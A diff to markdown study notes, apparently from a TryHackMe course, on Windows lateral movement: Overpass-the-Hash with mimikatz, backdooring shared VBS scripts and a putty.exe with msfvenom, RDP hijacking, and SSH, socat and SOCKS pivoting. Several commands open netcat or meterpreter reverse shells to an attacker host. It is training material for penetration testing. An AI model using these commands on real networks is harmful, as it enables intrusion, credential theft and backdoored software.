@@ -218,4 +218,104 @@
 			- Extracting `TGT`s will require administrator's credentials, and extracting `TGS`s will only need low-privileged account (only the ones assigned to that account).
 			- After extracting the ticket, inject the tickets into the current session using `kerberos::ptt <ticket>`.
 			- Check if the tickets were correctly injected using `klist` from CMD.
-			- 
+		- **Overpass-the-Hash / Pass-the-Key**
+			- Similar to PtH but applied to Kerberos networks.
+			- When a user requests a TGT, he sends a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either `DES` (disabled by default on current Windows versions), `RC4`, `AES128`, or `AES256`.
+			- If we have any of those keys, we can ask the KDC for a TGT.
+			- Obtain Kerberos encryption keys from memory by using
+				- Start mimikatz using `.\mimikatz.exe`
+				- `privilege::debug`
+				- `sekurlsa::ekeys`
+				- Depending on the encryption, we can run a reverse shell using netcat `sekurlsa::pth /user:<username> /domain:<domain> /<encryption>:<key> /run:"c:\tools\nc64.exe -e cmd.exe <attacker-ip> 5565`.
+				- **NOTE: RC4 key is the same as the NTLM hash.**
+				- Receive the shell using `nc -lvp 5565`.
+- ## *Abusing User Behavior*
+	- #### *Abusing Writable Shares*
+		- Plant specific files in writable shares to force users into executing any payload and gain access to their machines.
+		- For example, finding a shortcut to a script or executable file hosted on network.
+			- This could be used by administrators to allow users to execute it without copying or installing the application to each user's machines.
+			- Although the script/executable is hosted on a server, when a user opens the shortcut, the executable will be copied from the server to `%temp%` folder and executed on the device.
+			- By changing the pointed `target` in the properties of the executable, we can point to our payload or even run netcat to open a reverse shell.
+		- **Backdooring .vbs Scripts**
+			- If the shared resource is a VBS script, we can put a copy of `nc64.exe` on the same share, and inject `CreatObject("WScript.Shell").Run "cmd.exe /c copy /Y \\<ip>\<share>\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker-ip> 1234", 0, True`
+			- This will copy `nc64.exe` from the share to the user's `%tmp%` directory and send a reverse shell back to attacker when the user opens the shared VBS script.
+		- **Backdooring .exe Files**
+			- If the shared file is a Windows binary, for example `putty.exe`, we can download it and use `msfvenom` to inject a backdoor into it.
+			- The binary will still work, but will run our payload silently.
+			- `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker-ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`
+			- Replace the executable in the share with our newly created one and use the `exploit/multi/handler` module to wait for the `meterpreter` shell.
+		- **RDP Hijacking**
+			- When an administrator uses RDP to connect to a machine and closes the RDP instead of logging off, his session will remain open on the server indefinitely.
+			- If we have SYSTEM privileges on Windows Server 2016 and earlier, we can take over an existing RDP session without requiring a password.
+			- If we have administrator access, we can get SYSTEM by a lot of methods, like `psexec.exe`
+				- `PsExec64.exe -s cmd.exe`
+				- List the existing sessions on a server use `query user`.
+				- Any session with `Disc` state has been left open by the user.
+				- We can take over active sessions, but the user will be forced out.
+				- Connect to a session using `tscon <session-id> /dest:<our-admin-rdp-session-name>`.
+- ## *Port Forwarding*
+	- Most of the lateral movement techniques require specific ports to be available, in rea-world networks, administrators may have blocked some of these ports or have implemented segmentation around the network, preventing us from reaching `SMB`, `RDP`, `WinRM`, or `RPC` ports.
+	- To go around this, we can use port forwarding techniques, using any compromised host as a jump box to pivot to other hosts.
+	- It is expected that some machines will have more network permissions than others.
+	- #### *SSH Tunneling*
+		- Has built-in functionality to do port forwarding.
+		- **Example**
+			- Assume we have compromised a machine called `PC-1` (doesn't have to be administrator access) and would like to use it as a pivot to access a port on another machine that we cant directly access.
+			- We'll start a tunnel from `PC-1` machine, acting as an SSH client, to our attacking machine, which will act as an SSH server.
+			- The reasoning behind this is that Windows machines typically contains SSH client and not server.
+			- Since we'll be making a connection back to our attacking machine, we'll create a user without access to any console for tunneling.
+				- `useradd tunneluser -m -d /home/tunneluser -s /bin/true`
+				- `passwd tunneluser`
+			- **SSH Remote Port Forwarding**
+				- Let's say the firewall policies are blocking the attacking machine from directly accessing port 3389 on the server.
+				- Remote Port Forwarding allows us to take a reachable port from the SSH client (`PC-1`) and project it into a remote SSH server (attacking machine).
+				- As a result, a port will be opened in the attacker machine that can be used to connect back to port 3389 in the server through the SSH tunnel.
+				- `PC-1` will in turn proxy the connection so that the server will see all the traffic as if it was coming from `PC-1`.
+				- ![](remote-port-fwd.png)
+				- **NOTE: We need port forwarding after we have compromised PC-1 because in a situation where we only have console access to PC-1, we won't be able to use any RDP client as we don't have GUI**
+				- In case we want to run an exploit against a port that can't be reached directly, as our exploit may require a specific scripting language that may not be available at machines we compromise along the way.
+				- Forward port 3389 on the server back to our attacking machine using the following on `PC-1` `ssh tunneluser@<attacker-ip> -R 3389:<Server-ip>:3389 -N`.
+					- `-N` to prevent the client from requesting a shell since `tunneluser` doesn't have access to one.
+					- `-R` to request port forwarding.
+					- The first port 3389 indicates the port we will be opening on the SSH server (attacking machine).
+					- The second port 3389 indicates the port that we'll be forwarding.
+					- They don't have to match.
+				- Once the tunnel is set and running, go to the attacker machine and RDP into the forwarded port to reach the server `xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword`.
+			- **SSH Local Port Forwarding**
+				- Allows us to pull a port from an SSH server into the SSH client.
+				- This could be used to take any service available in our attacking machine and make it available through a port on `PC-1`.
+				- That way any host that can't directly connect directly to the attacker's machine but can connect to `PC-1` will now be able to reach the attacker's services through the pivot host.
+				- Allows us to run reverse shells from hosts from hosts that normally wouldn't connect back to us.
+				- ![](local-port-fwd.png)
+				- Forward port 80 from the attacking machine and make it available from `PC-1` using the following from `PC-1` `ssh tunneluser@<attacker-ip> -L *:80:127.0.0.1:80 -N`.
+					- `-L` for local port forwarding.
+					- `*:80` indicates the local socket used by `PC-1` to receive connections.
+					- `127.0.0.1:80` remote socket to connect to from the attacking machine.
+					- Loop-back is used in the second socket, as from the attacker's perspective, that's the host that holds the port 80 to be forwarded.
+				- Since we'll be opening a new port on `PC-1`, we might need to add a firewall rule to allow for incoming connections.
+				- Administrative privileges are needed for this `netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80`.
+				- Once the tunnel is set up, any user pointing their browser to `http://<pc1-ip>:80` will see the website published by the attacking machine.
+		- #### *Port Forwarding With Socat*
+			- In situations where SSH isn't available.
+			- One disadvantage is we have to transfer `socat` to the pivot host `PC-1`, making it more detectable.
+			- Open port 1234 on a host and forward any connection we receive there to port 4321 on attacking machine `socat TCP4-LISTEN:1234,fork TCP4:<attacking-ip>:4321`.
+				- The `fork` option allows `socat` to fork a new process for each connection received, making it possible to handle multiple connections without closing.
+				- If we don't include it, `socat` will close when the first connection made is finished.
+			- If we wanted to access port 3389 on the server using `PC-1` as a pivot as we did with SSH remote port forwarding, use `socat TCP4-LISTEN:3389 TCP4:<Server-ip>:3389`.
+				- `socat` can't forward the connection directly to the attacker's machine as SSH did but will open a port on `PC-1` that the attacker's machine can then connect to.
+			- Since a port is being opened on the pivot host, we might need a firewall rule to allow any connections to that port `netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389`.
+			- To expose port 80 from the attacker machine so that it is reachable by the Server, use `socat TCP4-LISTEN:80,fork TCP4:<attacker-ip>:80`.
+				- As a result, `PC-1` will spawn port 80 and listen for connections to be forwarded to port 80 on the attacking machine.
+		- #### *Dynamic Port Forwarding and SOCKS*
+			- For situations where we want to run scans against many ports of a host, or even many ports across many machines, all through pivot host.
+			- Use the SSH client to establish a reverse dynamic port forwarding with `ssh tunneluser@<attacker-ip> -R 9050 -N`.
+				- The SSH server (attacking machine) will start a SOCKS proxy on port 9050, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client `PC-1`.
+			- The interesting thing is, we can easily use any of our tools through the SOCKS proxy by using `proxychains`.
+				- To do that we first need to make sure that `proxychains` is correctly configured to point any connection to the same port used by SSH for the SOCKS proxy.
+				- The `proxychains` configuration file can be found in `/etc/proxychains.conf`.
+				- At the end of the configuration file, a line that indicates the port in use for SOCKS proxying should be seen
+					`[ProxyList]`
+					`socks4 127.0.0.1 9050`
+				- The default is 9050 but any port could be used as long as it matches the the one used when establishing the SSH tunnel.
+				- Execute any command through the proxy using `proxychains curl http://pxeboot.za.tryhackme.com`.
+				- **NOTE: Nmap might not work with SOCKS in some situations, and might show altered results.**
